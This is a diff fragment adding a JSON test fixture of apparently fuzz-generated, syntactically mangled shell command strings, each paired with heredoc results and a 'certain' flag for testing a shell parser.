+  "cmd": "a=x$[|]cat X-((||$'E$[$(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "))a=[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\t<<- <<<cat '$((|<<-=(@($[@(@(]-$[-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "|Xcat \nEOF\n",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": ";$(=(=(&((]cat ${$((<<[]\"\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\nEOF\n \"${&\\\n<<<$'E\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$'];<<-\n\"((]))<<<(E\t@(|",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "${))<<<[x",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1$;|cat |'}$(-X$[))",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "#$(EOF|(cat ))`)\nEOF\n$(#",
+  "heredocs": [],
+  "certain": false
+ }
+]
